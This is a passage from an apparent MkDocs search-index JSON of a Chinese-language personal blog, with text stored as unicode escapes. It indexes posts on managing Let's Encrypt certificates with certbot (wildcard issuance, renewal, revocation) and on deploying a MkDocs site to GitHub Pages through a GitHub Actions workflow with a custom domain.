\u4e5f\u8bb8\u4f1a\u53d8\u5316\uff0c\u4f46\u662f\u4f60\u603b\u80fd\u5728 Let's Encrypt \u7684 \u6587\u6863 \u4e0a\u627e\u5230\u6700\u65b0\u7684\u3002 \u6267\u884c\u4e4b\u540e\u4f1a\u4ea4\u7ed9\u4f60\u4e00\u4e2a\u6216\u4e24\u4e2a\u8bbe\u7f6e TXT \u8bb0\u5f55\u7684\u4efb\u52a1\u3002\u53bb\u4f60\u7684 DNS \u670d\u52a1\u63d0\u4f9b\u5546\u5904\u8bbe\u7f6e\u597d\u5373\u53ef\u3002","title":"\u7533\u8bf7\u6cdb\u57df\u540d\u8bc1\u4e66\uff08\u4e5f\u53eb\u901a\u914d\u7b26\u8bc1\u4e66\uff09"},{"location":"blog/2022/220407-certbot/#_4","text":"systemctl list-timers","title":"\u67e5\u770b\u81ea\u52a8\u7eed\u671f\u7684\u8ba1\u5212\u4efb\u52a1"},{"location":"blog/2022/220407-certbot/#_5","text":"\u4e0d\u52a0\u4efb\u4f55\u53c2\u6570\uff0c\u6ca1\u6709\u4e34\u8fd1\u5230\u671f\u65f6\u95f4\u7684\u8bdd\u4f1a\u505c\u6b62\u6267\u884c certbot renew \u6d4b\u8bd5\u7eed\u671f\uff0c\u4e0d\u4f1a\u771f\u7684\u7eed\u671f certbot renew --dry-run \u5f3a\u5236\u7eed\u671f certbot renew --force-renewal","title":"\u624b\u52a8\u4e3a\u8bc1\u4e66\u7eed\u671f"},{"location":"blog/2022/220407-certbot/#_6","text":"\u6cdb\u57df\u540d\u8bc1\u4e66\u4e0d\u80fd\u901a\u8fc7 certbot renew \u6765\u7eed\u671f\uff0c\u9700\u8981\u624b\u52a8\u7eed\u671f\u3002\u5426\u5219\u4f1a\u62a5\u9519\u3002 \u539f\u56e0\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u4f60\u5728\u7533\u8bf7\u6cdb\u57df\u540d\u8bc1\u4e66\u7684\u65f6\u5019\u5728 DNS \u670d\u52a1\u5546\u90a3\u91cc\u6dfb\u52a0\u7684 TXT \u8bb0\u5f55\uff0c\u8fd9\u662f\u4e00\u4e2a\u4f1a\u53d8\u5316\u7684\u503c\u3002 \u7eed\u671f\u65b9\u6cd5\u548c\u7533\u8bf7\u65b9\u6cd5\u4e00\u6a21\u4e00\u6837\uff0c\u76f8\u5f53\u4e8e\u91cd\u65b0\u7533\u8bf7\u4e00\u6b21\u3002 certbot certonly -d \"*.example.com\" -d \"example.com\" --manual --preferred-challenges dns --server https://acme-v02.api.letsencrypt.org/directory \u4e2d\u9014\u540c\u6837\u9700\u8981\u4fee\u6539 DNS \u7684 TXT \u8bb0\u5f55\u8fd9\u6837\u7684\u64cd\u4f5c\u3002\u6709\u4eba\u53ef\u80fd\u4f1a\u89c9\u5f97\u5f88\u9ebb\u70e6\uff0c\u9ebb\u70e6\u4f60\u5c31\u53bb\u5199\u4e2a\u811a\u672c\u554a\u3002 \u4e8b\u5b9e\u4e0a certbot \u7684\u62a5\u9519\u4e5f\u8bf4\u5f97\u5f88\u6e05\u695a\u4e86\uff0c\u4ed6\u7684\u610f\u601d\u5c31\u662f\u8981\u6211\u4eec\u53bb\u5199\u4e2a\u811a\u672c\uff1a An authentication script must be provided with --manual-auth-hook when using the manual plugin non-interactively. \u7f51\u4e0a\u6709\u5404\u4e2a\u7248\u672c\u7684\u811a\u672c\uff0c\u5927\u6982\u539f\u7406\u90fd\u662f\u901a\u8fc7\u4f60 DNS \u670d\u52a1\u5546\u63d0\u4f9b\u7684 Token\uff0c\u5728\u670d\u52a1\u5668\u4e0a\u76f4\u63a5\u4fee\u6539 DNS \u7684 TXT \u8bb0\u5f55\u3002\u4e00\u641c\u4e00\u5927\u5806\u3002","title":"\u4e3a\u8bc1\u4e66\u7eed\u671f\uff08\u6cdb\u57df\u540d\uff09"},{"location":"blog/2022/220407-certbot/#_7","text":"\u8fd9\u91cc\u76f4\u63a5\u5f15\u7528 Let's Encrypt \u5b98\u7f51 \u7528\u9881\u53d1\u8bc1\u4e66\u7684\u8d26\u6237\u540a\u9500\u8bc1\u4e66 certbot revoke --cert-path /etc/letsencrypt/archive/ ${ YOUR_DOMAIN } /cert1.pem \u4f7f\u7528\u8bc1\u4e66\u79c1\u94a5\u540a\u9500\u8bc1\u4e66 certbot revoke --cert-path /PATH/TO/cert.pem --key-path /PATH/TO/key.pem \u4f7f\u7528\u5176\u4ed6\u6388\u6743\u5e10\u6237\u540a\u9500\u8bc1\u4e66 \u5148\u4ece crt.sh \u4e2d\u4e0b\u8f7d\u8bc1\u4e66\uff0c\u7136\u540e\uff1a certbot revoke --cert-path /PATH/TO/downloaded-cert.pem","title":"\u540a\u9500\uff08\u64a4\u9500\uff09\u8bc1\u4e66"},{"location":"blog/2022/220407-certbot/#_8","text":"certbot delete","title":"\u5220\u9664\u8bc1\u4e66"},{"location":"blog/2022/220407-github-pages/","tags":["github actions","github pages","mkdocs"],"text":"\u8fd9\u7bc7\u6587\u7ae0\u8bb2\u8ff0\u4e86\u5982\u4f55\u4f7f\u7528 GitHub Actions / Pages \u81ea\u52a8\u5316\u90e8\u7f72\u6587\u6863\uff0c\u4ee5\u53ca\u9047\u5230\u7684\u5751\u3002 \u5982\u4f60\u6240\u89c1\uff0c\u8fd9\u4e2a\u535a\u5ba2\u4e5f\u662f\u4f7f\u7528 GitHub Actions \u81ea\u52a8\u90e8\u7f72\u5728 GitHub Pages \u4e0a\u7684\u3002 \u8fd9\u7bc7\u6587\u7ae0\u5c06\u4ee5 MkDocs \u4e3a\u4f8b\u8bb2\u8ff0\u3002 \u672c\u5730\u90e8\u7f72\u6d4b\u8bd5 \u00b6 \u9996\u5148\u4f60\u81ea\u5df1\u642d\u5efa\u7684\u6587\u6863\u5f97\u5728\u672c\u5730\u80fd\u7528\u561b\uff0c\u9996\u5148\u6d4b\u8bd5\u4e0b\u672c\u5730\u662f\u5426\u80fd\u7528\uff1a mkdocs serve \u5c0f\u63d0\u793a \u4f7f\u7528\u4ee5\u4e0b\u53c2\u6570\u53ef\u4ee5\u4f7f mkdocs \u8fd0\u884c\u5728\u6307\u5b9a\u5730\u5740\u548c\u7aef\u53e3\u4e0a\uff1a mkdocs serve -a localhost:8001 mkdocs serve --dev-addr localhost:8001 \u521b\u5efa\u672c\u5730 VCS \u5e76\u548c GitHub \u5173\u8054 \u00b6 \u8fd9\u91cc\u4ee5 PyCharm \u4e3a\u4f8b\uff1a \u521b\u5efa\u672c\u5730 VCS \u00b6 graph LR A[VCS] --> B; B[\u542f\u7528\u7248\u672c\u63a7\u5236\u96c6\u6210] --> C; C[\u9009\u62e9 Git] --> D[\u786e\u5b9a]; \u6ce8\u610f\u6709\u5751 \u8bb0\u5f97\u5728\u63d0\u4ea4\u4e4b\u524d\u5148\u521b\u5efa\u597d .gitignore \u6587\u4ef6\uff0c\u5426\u5219\u4f60\u63d0\u4ea4\u4e4b\u540e\u8fd8\u8981\u7ee7\u7eed\u63d0\u4ea4\u4e00\u6b21 .gitignore \u6587\u4ef6\u3002 \u7136\u540e\u9009\u62e9\u63d0\u4ea4\u3002 \u548c GitHub \u5173\u8054 \u00b6 \u8fd9\u4e00\u6b65\u5176\u5b9e\u662f\u5728 GitHub \u4e0a\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a\u540c\u540d\u4ed3\u5e93\u3002\u5982\u679c\u4ed3\u5e93\u5df2\u7ecf\u5b58\u5728\u7684\u8bdd\uff0c\u53ef\u80fd\u9700\u8981 Merge \u6216\u8005 Rebase\u3002 graph LR A[Git] --> B; B[GitHub] --> C; C[\u5728 GitHub \u4e0a\u5171\u4eab\u9879\u76ee] --> D[\u786e\u5b9a]; \u5728 GitHub \u4e0a\u521b\u5efa Actions \u4efb\u52a1 \u00b6 \u8fd9\u4e00\u6b65\u5751\u5de8\u591a\u3002 \u9996\u5148\u70b9\u51fb Actions -> set up a workflow yourself \u6309\u7167\u4efb\u4f55\u4e00\u4e2a\u4f60\u80fd\u627e\u5230\u7684 Pages \u90e8\u7f72\u6587\u6863\u6765\u5199\u8fd9\u4e2a yml \u6587\u4ef6\uff0c\u8fd9\u91cc\u6211\u4eec\u91c7\u7528 Material for MkDocs \u7684\u6a21\u677f\u3002 \u5c0f\u63d0\u793a \u7528 MkDocs \u5b98\u7f51 \u7684\u4e5f\u884c\uff0c\u53ea\u4e0d\u8fc7\u4eba\u5bb6\u4e0d\u4f1a\u544a\u8bc9\u4f60\u600e\u4e48\u5199\u8fd9\u4e2a yml \u6587\u4ef6\u3002 \u5728 2022\u5e744\u67086\u65e5 \u7684\u65f6\u5019\u6211\u4ece\u8fd9\u91cc\u627e\u5230\u7684\u6a21\u677f\u662f\u8fd9\u6837\u7684\uff0c\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\u53ef\u80fd\u4f1a\u6709\u53d8\u66f4\uff0c\u5efa\u8bae\u4ece\u539f\u6587\u6863\u53bb\u590d\u5236\u3002 main.yml\uff08\u8bf7\u52ff\u76f4\u63a5\u4f7f\u7528\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 name : ci on : push : branches : - master - main jobs : deploy : runs-on : ubuntu-latest steps : - uses : actions/checkout@v2 - uses : actions/setup-python@v2 with : python-version : 3.x - run : pip install mkdocs-material - run : mkdocs gh-deploy --force \u6ce8\u610f\u6709\u5751 \u9996\u5148\u4ed6\u8fd9\u4e2a\u6d41\u7a0b\uff0c\u5f88\u660e\u663e\u53ea\u7528 pip \u5b89\u88c5\u4e86 mkdocs-material \uff0c\u4f46\u662f\u5b83\u5e76\u6ca1\u6709\u5b89\u88c5 mkdocs \u3002\u5176\u5b9e\u8fd9\u65e0\u6240\u8c13\uff0c\u56e0\u4e3a mkdocs-material \u7684 requirements.txt \u4e2d\u5df2\u7ecf\u5305\u542b\u4e86 mkdocs \uff0c\u4f1a\u4e00\u5e76\u5b89\u88c5\u3002 \u91cd\u70b9\u7684\u5730\u65b9\u662f\uff0c\u5982\u679c\u4f60\u5728\u672c\u5730\u6784\u5efa\u7684\u65f6\u5019\u4f9d\u8d56\u4e86\u5176\u4ed6\u7684\u5e93\uff08\u6bd4\u5982 mkdocs-blogging-plugin \uff09\uff0c\u90a3\u4f60\u5f97\u5728 run: \u4e2d\u901a\u8fc7 pip install \u5b89\u88c5\u8fd9\u4e9b\u5e93\u3002 \u6ce8\u610f\u6709\u5751 \u5751\u8fd8\u6ca1\u5b8c\uff0c\u5982\u679c\u4f60\u548c\u6211\u4e00\u6837\u662f mkdocs-blogging-plugin \u7684\u4f7f\u7528\u8005\uff0c\u4f60\u8fd8\u4f1a\u9047\u5230\u7f51\u7ad9\u7684\u6e32\u67d3\u95ee\u9898\uff0c\u8fd9\u91cc\u5b98\u7f51\u4e5f\u7ed9\u4e86\u89e3\u51b3\u65b9\u6848\u3002 https://liang2kl.codes/mkdocs-blogging-plugin/#publish-with-github-pages \u6ce8\u610f\uff0c\u8bf7\u4e0d\u8981\u8ddf\u968f\u5b98\u7f51\u90a3\u7bc7\u6587\u6863\u91cc\u6240\u8bf4\u7684\u8bbe\u5b9a locale: zh-CN \u8fd9\u4e2a\u952e\uff0c\u540e\u9762\u4f1a\u8bf4\u5230\u539f\u56e0\u3002 \u6700\u7ec8\u6211\u7684 main.yml \uff08\u540e\u6765\u91cd\u547d\u540d\u6210 ci.yml \u4e86\uff09\u957f\u8fd9\u6837\uff1a main.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 name : ci on : push : branches : - master jobs : deploy : runs-on : ubuntu-latest steps : - uses : actions/checkout@v2 with : # mkdocs-blogging-plugin \u7ed9\u51fa\u7684\u6e32\u67d3\u95ee\u9898\u89e3\u51b3\u65b9\u6848 fetch-depth : 0 - uses : actions/setup-python@v2 with : python-version : 3.x - run : pip install mkdocs - run : pip install mkdocs-material - run : pip install mkdocs-blogging-plugin # \u8bb0\u5f97\u5b89\u88c5\u5176\u4ed6\u4f9d\u8d56\u7684\u5e93 - run : mkdocs gh-deploy --force \u8fd9\u4e2a\u65f6\u5019\u4f60\u5c31\u53ef\u4ee5\u5728 Actions \u9875\u9762\u70b9 Start commit \u4e86\u3002\u53ea\u8981\u4f60\u7684\u672c\u5730\u90e8\u7f72\u53ef\u4ee5\u901a\u8fc7\uff0c\u5728 Actions \u4e0a\u5e94\u8be5\u4e5f\u662f\u53ef\u4ee5\u901a\u8fc7\u7684\u3002 \u5982\u679c Actions \u7684 build \u6216\u8005 deploy \u9636\u6bb5\u51fa\u73b0\u4e86\u95ee\u9898\uff0c\u8bf4\u660e\u53ef\u80fd\u662f\u90a3\u51e0\u4e2a run \u91cc\u51fa\u73b0\u4e86\u9519\u8bef\uff0c\u90a3\u4f60\u5e94\u8be5\u5728\u672c\u5730\u8bd5\u4e00\u4e0b\uff1a \u662f\u4e0d\u662f\u6709\u5305\u5fd8\u4e86 pip install \uff1f \u672c\u5730\u80fd\u6b63\u5e38 mkdocs build \u561b\uff1f \u4e4b\u524d\u9047\u5230\u4e86\u4e00\u4e2a\u5178\u578b\u7684\u95ee\u9898\u5bfc\u81f4 build \u5931\u8d25\uff1a \u6ce8\u610f\u6709\u5751 mkdocs-blogging-plugin \u7684\u5b98\u7f51 \u6587\u6863 \u91cc\u8bf4\uff0c\u8981\u5728 blogging \u91cc\u5efa\u4e00\u4e2a locale: zh-CN \u6765\u8bbe\u7f6e\u65f6\u95f4\u683c\u5f0f\uff0c\u4f46\u662f\u5b9e\u9645\u8fd9\u6837\u505a\u4f1a\u62a5\u9519\uff1a ValueError: expected only letters, got 'zh-cn' \uff0c \u89e3\u51b3\u65b9\u6cd5\uff1a\u4e0d\u8981\u5199 locale: zh-CN \uff0c\u8981\u5199 locale: zh_CN \u6216\u8005\u5e72\u8106\u5199 locale: zh mkdocs.yml 1 2 3 plugins : - blogging : locale : zh_CN \u5751\u8fd8\u6ca1\u7ed3\u675f\uff0c\u7ee7\u7eed\u5f80\u4e0b\u770b \u8bbe\u7f6e Pages \u00b6 \u4f60\u4ee5\u4e3a\u8fd9\u6837\u5c31\u7ed3\u675f\u4e86\uff1f \u8fd8\u6ca1\u6709\uff01 Actions \u7ed3\u675f\u540e\u4f1a\u7ed9\u4f60\u4e00\u4e2a\u9875\u9762\uff08\u5f53\u7136\u4e5f\u53ef\u4ee5\u81ea\u5df1\u53bb\u627e\uff09\uff0c\u4f60\u70b9\u5f00\u8fd9\u4e2a\u9875\u9762\u4f1a\u76f4\u63a5\u544a\u8bc9\u4f60 404 \u3002 \u8fd9\u662f\u56e0\u4e3a\u4f60\u8fd8\u6ca1\u6709\u4e3a Pages \u6307\u5b9a\u5177\u4f53\u7684\u9875\u9762\u3002 \u5c0f\u63d0\u793a \u8fd9\u91cc\u7b80\u5355\u8bf4\u4e00\u4e0b\uff0c\u5f88\u591a\u4eba\u8ba4\u4e3a Actions \u548c Pages \u662f\u4e00\u4e2a\u4e1c\u897f\uff0c\u56e0\u4e3a\u5f88\u591a\u4eba\u7ecf\u5e38\u7528\u8fd9\u4fe9\u4e00\u8d77\u6765\u90e8\u7f72\u9875\u9762\u3002\u4f46\u662f\u5176\u5b9e\u8fd9\u4fe9\u7684\u529f\u80fd\u662f\u5404\u6709\u5206\u5de5\u3002 - Actions \u7684\u4e3b\u8981\u529f\u80fd\u662f\u7f16\u8bd1\uff0c\u5c31\u662f\u4f60\u6307\u5b9a\u4e00\u4e2a\u73af\u5883\uff0c\u7ed9\u51fa\u4e00\u4e9b\u7f16\u8bd1\u4e2d\u8981\u6267\u884c\u7684\u547d\u4ee4\u884c\uff0c\u7136\u540e\u7ed9\u51fa\u4f60\u7684\u6e90\u4ee3\u7801\uff08\u8fd9\u91cc\u7684\u6e90\u4ee3\u7801 GitHub \u4f1a\u81ea\u52a8\u4ece\u4f60\u7684 repo \u91cc\u83b7\u53d6\u6240\u4ee5\u4e0d\u7528\u7ba1\uff09\uff0cGitHub Actions \u5c31\u4f1a\u4ece\u6e90\u4ee3\u7801\u91cc\u7f16\u8bd1\u51fa\u5bf9\u5e94\u7684\u9759\u6001\u6587\u4ef6\uff0c\u8fd9\u4e9b\u9759\u6001\u6587\u4ef6\u53ef\u80fd\u662f\u5404\u79cd\u6587\u4ef6\uff0c\u6bd4\u5982\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u6216\u8005\u662f\u7f51\u9875\u3002 - Pages \u7684\u4e3b\u8981\u529f\u80fd\u662f\u5728 <user>.github.io \u4e0a\u90e8\u7f72\u7f51\u9875\u3002 Actions \u6bd5\u7adf\u53ea\u662f Actions\uff0c\u4ed6\u53c8\u4e0d\u662f\u548c Pages \u8054\u52a8\u7684\uff0c\u6240\u4ee5\u4f60\u5c31\u7b97 Actions \u7f16\u8bd1\u51fa\u4e86\u7f51\u9875\u4e5f\u662f\u4e0d\u4f1a\u7ed9\u4f60\u81ea\u52a8\u90e8\u7f72\u5230 Pages \u4e0a\u7684\u3002 \u63a5\u4e0b\u6765\u624b\u52a8\u8bbe\u7f6e Pages\uff1a graph LR A[\u6253\u5f00\u4f60\u7684\u9879\u76ee\u4ed3\u5e93] --> B; B[Settings] --> C; C[Pages] --> D[Source]; \u9009\u62e9\u5206\u652f\u4e3a gh-pages \uff0c\u8fd9\u662f Actions \u81ea\u52a8\u6784\u5efa\u7684\u6587\u4ef6\u6240\u5b58\u653e\u7684\u5206\u652f\uff0c\u76ee\u5f55\u9009\u62e9 / \u3002 \u70b9 save \uff0c\u8fd9\u4e0b\u662f\u771f\u6ca1\u95ee\u9898\u4e86\u3002 \uff08\u53ef\u9009\uff09\u4f7f\u7528\u81ea\u5b9a\u4e49\u57df\u540d \u00b6 \u4f7f\u7528\u81ea\u5b9a\u4e49\u57df\u540d\u53c8\u4f1a\u5e26\u6765\u4e24\u4e2a\u5751\uff0c\u65e0\u8bed\u3002 \u9996\u5148\u4f60\u5728\u8bbe\u7f6e Source \u7684\u65f6\u5019\uff0c\u80fd\u770b\u5230\u4e0b\u9762\u4e00\u680f\u662f Custom domain \uff0c\u8fd9\u4e2a\u5c31\u662f\u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\u7684\u5730\u65b9\uff0c\u6bd4\u5982\u6211\u8fd9\u4e2a\u535a\u5ba2\u6784\u5efa\u5728\u4e86 https://zhanbao2000.github.io/blog \uff0c\u4f46\u662f\u6211\u60f3\u8ba9 https://blog.arisa.moe/ \u6307\u5411\u8fd9\u4e2a\u535a\u5ba2\uff0c\u5c31\u5f97\u4fee\u6539\u8fd9\u73a9\u610f\u3002 \u5c0f\u63d0\u793a \u73b0\u5728\u8bbf\u95ee https://zhanbao2000.github.io/blog \u4f1a\u88ab 301 \u91cd\u5b9a\u5411\u5230 https://blog.arisa.moe/ \u76f4\u63a5\u5728\u6846\u6846\u91cc\u5199\u4f60\u7684\u57df\u540d\u80af\u5b9a\u662f\u4e0d\u884c\u7684\uff0c\u5e94\u8be5\u9075\u5faa\u4ee5\u4e0b\u6b65\u9aa4\uff0c\u4ee5\u672c\u7ad9\u4e3a\u4f8b\uff1a \u627e\u5230\u4f60\u57df\u540d\u7684 DNS \u670d\u52a1\u5546\uff0c\u6dfb\u52a0\u4e00\u4e2a CNAME \u8bb0\u5f55\uff1a blog.arisa.moe. 1 IN CNAME zhanbao2000.github.io. \u5728\u521a\u521a\u90a3\u4e2a\u6846\u91cc\u8f93\u5165 blog.arisa.moe \uff0c\u70b9 save \u3002 \u8fc7\u4e00\u4f1a\u5c31\u597d\u4e86\u3002 \u4f60\u4ee5\u4e3a\u8fd9\u6837\u5c31\u5b8c\u4e86\uff1f \u6ce8\u610f\u6709\u5751 \u5982\u679c\u4f60\u4ee5\u4e3a\u8fd9\u6837\u5c31\u5b8c\u4e86\uff0c\u7b49\u4f60\u4e0b\u6b21\u518d\u901a\u8fc7 git push \u63d0\u4ea4\u6587\u6863/\u535a\u5ba2\u7684\u65f6\u5019\uff0c\u4f60\u5c31\u4f1a\u53d1\u73b0\u4f60\u7684\u81ea\u5b9a\u4e49\u57df\u540d\u5df2\u7ecf\u53d8\u6210 404 \u4e86\u3002 \u6b64\u65f6\u4f60\u6253\u5f00 GitHub \u5bf9\u5e94\u4ed3\u5e93\u7684 Settings \u4e00\u770b\uff0c\u597d\u5bb6\u4f19\uff0c\u6846\u6846\u91cc\u4ec0\u4e48\u90fd\u6ca1\u6709\u4e86\u3002 \u5148\u8bf4\u89e3\u51b3\u65b9\u6cd5\u518d\u8bf4\u539f\u56e0\u3002 \u89e3\u51b3\u65b9\u6cd5\u662f\uff0c\u5728 docs \u6587\u4ef6\u5939\u91cc\u521b\u5efa\u4e00\u4e2a CNAME \u6587\u4ef6\uff0c\u5185\u5bb9\u5199\u4e0a\u4f60\u7684\u81ea\u5b9a\u4e49\u57df\u540d\uff0c\u4e0b\u6b21 Actions \u8fd0\u884c\u7684\u65f6\u5019\uff0cPages \u5c31\u4f1a\u81ea\u52a8\u628a\u8fd9\u4e2a\u57df\u540d\u8bbe\u7f6e\u6210\u81ea\u5b9a\u4e49\u57df\u540d\u4e86\u3002 \u53c2\u8003\u4ee5\u4e0b\uff1a Deploying seems to overwrite custom domain #213 gh-pages -d dist overwrites custom domain #127 MkDocs - Custom Domains \ud83d\udc49 \u5176\u5b9e MkDocs \u5b98\u7f51\u6709\u5199 \u8fd9\u4e9b issues \u65e0\u4e00\u4f8b\u5916\u90fd\u63d0\u5230\u4e86\u8981\u521b\u5efa\u4e00\u4e2a CNAME \u6587\u4ef6\u6765\u6307\u793a\u81ea\u5df1\u7684\u81ea\u5b9a\u4e49\u57df\u540d\u3002\u4f46\u662f\u8ddd\u79bb issue \u63d0\u51fa\u597d\u50cf\u5df2\u7ecf\u8fc7\u4e865\u5e74\u4e86\u4e5f\u6ca1\u89c1\u5230 GitHub \u5b98\u65b9\u4fee\u590d\u8fd9\u4e2a\u95ee\u9898\u3002 \u6211\u81ea\u5df1\u63a8\u6d4b\u7684\u539f\u56e0\u662f\u8fd9\u6837\u7684\uff1a \u5728 Pages \u9875\u9762\u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\u7684\u65f6\u5019\uff0c\u5b9e\u9645\u4e0a\u662f\u5728\u9879\u76ee\u751f\u6210\u76ee\u5f55\u91cc\u81ea\u52a8\u521b\u5efa\u4e86\u4e00\u4e2a CNAME \u6587\u4ef6\u7684\uff0c\u548c\u6211\u4eec\u624b\u52a8\u521b\u5efa\u7684\u6548\u679c\u4e00\u6837\u3002\u4f46\u662f\u5728 Actions \u8fd0\u4f5c\u7684\u65f6\u5019\uff0c\u4f1a\u8986\u76d6\u6389\u6574\u4e2a\u9879\u76ee\u751f\u6210\u76ee\u5f55\uff0c\u5305\u62ec\u8fd9\u4e2a CNAME \u6587\u4ef6\u3002 \u90a3\u4e48\u5c31\u6709\u4e24\u4e2a\u529e\u6cd5\u6765\u89e3\u51b3\uff1a \u6bcf\u6b21 Actions \u7ed3\u675f\u4e4b\u540e\uff0c\u624b\u52a8\u53bb Pages \u9875\u9762\u6dfb\u52a0\u81ea\u5b9a\u4e49\u57df\u540d\u3002 \u8ba9 Actions \u7ed3\u675f\u4e4b\u540e\uff0c\u9879\u76ee\u751f\u6210\u76ee\u5f55\u91cc\u59cb\u7ec8\u6709\u8fd9\u4e2a CNAME \u6587\u4ef6\u3002 \u4e8e\u662f\u6211\u4eec\u9009\u62e9\u4e86\u540e\u8005\u3002","title":"GitHub Pages \u6587\u6863\u81ea\u52a8\u5316\u90e8\u7f72 - MkDocs"},{"location":"blog/2022/220407-github-pages/#_1","text":"\u9996\u5148\u4f60\u81ea\u5df1\u642d\u5efa\u7684\u6587\u6863\u5f97\u5728\u672c\u5730\u80fd\u7528\u561b\uff0c\u9996\u5148\u6d4b\u8bd5\u4e0b\u672c\u5730\u662f\u5426\u80fd\u7528\uff1a mkdocs serve \u5c0f\u63d0\u793a \u4f7f\u7528\u4ee5\u4e0b\u53c2\u6570\u53ef\u4ee5\u4f7f mkdocs \u8fd0\u884c\u5728\u6307\u5b9a\u5730\u5740\u548c\u7aef\u53e3\u4e0a\uff1a mkdocs serve -a localhost:8001 mkdocs serve --dev-addr localhost:8001","title":"\u672c\u5730\u90e8\u7f72\u6d4b\u8bd5"},{"location":"blog/2022/220407-github-pages/#vcs-github","text":"\u8fd9\u91cc\u4ee5 PyCharm \u4e3a\u4f8b\uff1a","title":"\u521b\u5efa\u672c\u5730 VCS \u5e76\u548c GitHub \u5173\u8054"},{"location":"blog/2022/220407-github-pages/#vcs","text":"graph LR A[VCS] --> B; B[\u542f\u7528\u7248\u672c\u63a7\u5236\u96c6\u6210] --> C; C[\u9009\u62e9 Git] --> D[\u786e\u5b9a]; \u6ce8\u610f\u6709\u5751 \u8bb0\u5f97\u5728\u63d0\u4ea4\u4e4b\u524d\u5148\u521b\u5efa\u597d .gitignore \u6587\u4ef6\uff0c\u5426\u5219\u4f60\u63d0\u4ea4\u4e4b\u540e\u8fd8\u8981\u7ee7\u7eed\u63d0\u4ea4\u4e00\u6b21 .gitignore \u6587\u4ef6\u3002 \u7136\u540e\u9009\u62e9\u63d0\u4ea4\u3002","title":"\u521b\u5efa\u672c\u5730 VCS"},{"location":"blog/2022/220407-github-pages/#github","text":"\u8fd9\u4e00\u6b65\u5176\u5b9e\u662f\u5728 GitHub \u4e0a\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a\u540c\u540d\u4ed3\u5e93\u3002\u5982\u679c\u4ed3\u5e93\u5df2\u7ecf\u5b58\u5728\u7684\u8bdd\uff0c\u53ef\u80fd\u9700\u8981 Merge \u6216\u8005 Rebase\u3002 graph LR A[Git] --> B; B[GitHub] --> C; C[\u5728 GitHub \u4e0a\u5171\u4eab\u9879\u76ee] --> D[\u786e\u5b9a];","title":"\u548c GitHub \u5173\u8054"},{"location":"blog/2022/220407-github-pages/#github-actions","text":"\u8fd9\u4e00\u6b65\u5751\u5de8\u591a\u3002 \u9996\u5148\u70b9\u51fb Actions -> set up a workflow yourself \u6309\u7167\u4efb\u4f55\u4e00\u4e2a\u4f60\u80fd\u627e\u5230\u7684 Pages \u90e8\u7f72\u6587\u6863\u6765\u5199\u8fd9\u4e2a yml \u6587\u4ef6\uff0c\u8fd9\u91cc\u6211\u4eec\u91c7\u7528 Material for MkDocs \u7684\u6a21\u677f\u3002 \u5c0f\u63d0\u793a \u7528 MkDocs \u5b98\u7f51 \u7684\u4e5f\u884c\uff0c\u53ea\u4e0d\u8fc7\u4eba\u5bb6\u4e0d\u4f1a\u544a\u8bc9\u4f60\u600e\u4e48\u5199\u8fd9\u4e2a yml \u6587\u4ef6\u3002 \u5728 2022\u5e744\u67086\u65e5 \u7684\u65f6\u5019\u6211\u4ece\u8fd9\u91cc\u627e\u5230\u7684\u6a21\u677f\u662f\u8fd9\u6837\u7684\uff0c\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\u53ef\u80fd\u4f1a\u6709\u53d8\u66f4\uff0c\u5efa\u8bae\u4ece\u539f\u6587\u6863\u53bb\u590d\u5236\u3002 main.yml\uff08\u8bf7\u52ff\u76f4\u63a5\u4f7f\u7528\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 name : ci on : push : branches : - master - main jobs : deploy : runs-on : ubuntu-latest steps : - uses : actions/checkout@v2 - uses : actions/setup-python@v2 with : python-version : 3.x - run : pip install mkdocs-material - run : mkdocs gh-deploy --force \u6ce8\u610f\u6709\u5751 \u9996\u5148\u4ed6\u8fd9\u4e2a\u6d41\u7a0b\uff0c\u5f88\u660e\u663e\u53ea\u7528 pip \u5b89\u88c5\u4e86 mkdocs-material \uff0c\u4f46\u662f\u5b83\u5e76\u6ca1\u6709\u5b89\u88c5 mkdocs \u3002\u5176\u5b9e\u8fd9\u65e0\u6240\u8c13\uff0c\u56e0\u4e3a mkdocs-material \u7684 requirements.txt \u4e2d\u5df2\u7ecf\u5305\u542b\u4e86 mkdocs \uff0c\u4f1a\u4e00\u5e76\u5b89\u88c5\u3002 \u91cd\u70b9\u7684\u5730\u65b9\u662f\uff0c\u5982\u679c\u4f60\u5728\u672c\u5730\u6784\u5efa\u7684\u65f6\u5019\u4f9d\u8d56\u4e86\u5176\u4ed6\u7684\u5e93\uff08\u6bd4\u5982 mkdocs-blogging-plugin \uff09\uff0c\u90a3\u4f60\u5f97\u5728 run: \u4e2d\u901a\u8fc7 pip install \u5b89\u88c5\u8fd9\u4e9b\u5e93\u3002 \u6ce8\u610f\u6709\u5751 \u5751\u8fd8\u6ca1\u5b8c\uff0c\u5982\u679c\u4f60\u548c\u6211\u4e00\u6837\u662f mkdocs-blogging-plugin \u7684\u4f7f\u7528\u8005\uff0c\u4f60\u8fd8\u4f1a\u9047\u5230\u7f51\u7ad9\u7684\u6e32\u67d3\u95ee\u9898\uff0c\u8fd9\u91cc\u5b98\u7f51\u4e5f\u7ed9\u4e86\u89e3\u51b3\u65b9\u6848\u3002 https://liang2kl.codes/mkdocs-blogging-plugin/#publish-with-github-pages \u6ce8\u610f\uff0c\u8bf7\u4e0d\u8981\u8ddf\u968f\u5b98\u7f51\u90a3\u7bc7\u6587\u6863\u91cc\u6240\u8bf4\u7684\u8bbe\u5b9a locale: zh-CN \u8fd9\u4e2a\u952e\uff0c\u540e\u9762\u4f1a\u8bf4\u5230\u539f\u56e0\u3002 \u6700\u7ec8\u6211\u7684 main.yml \uff08\u540e\u6765\u91cd\u547d\u540d\u6210 ci.yml \u4e86\uff09\u957f\u8fd9\u6837\uff1a main.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 name : ci on : push : branches : - master jobs : deploy : runs-on : ubuntu-latest steps : - uses : actions/checkout@v2 with : # mkdocs-blogging-plugin 